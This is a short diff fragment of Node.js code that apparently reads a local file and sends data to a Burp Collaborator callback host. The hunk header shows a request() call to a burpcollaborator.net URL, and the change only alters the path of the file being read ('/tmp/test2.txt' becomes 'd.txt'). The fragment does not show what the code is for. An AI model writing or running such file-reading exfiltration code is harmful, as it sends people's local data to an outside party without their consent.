@@ -71,7 +71,7 @@ request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=St
 
 var request = require('request');
 const fs = require('fs')
-fs.readFile('/tmp/test2.txt', 'utf8' , (err, data) => {
+fs.readFile('d.txt', 'utf8' , (err, data) => {
   if (err) {
     console.error(err)
     return
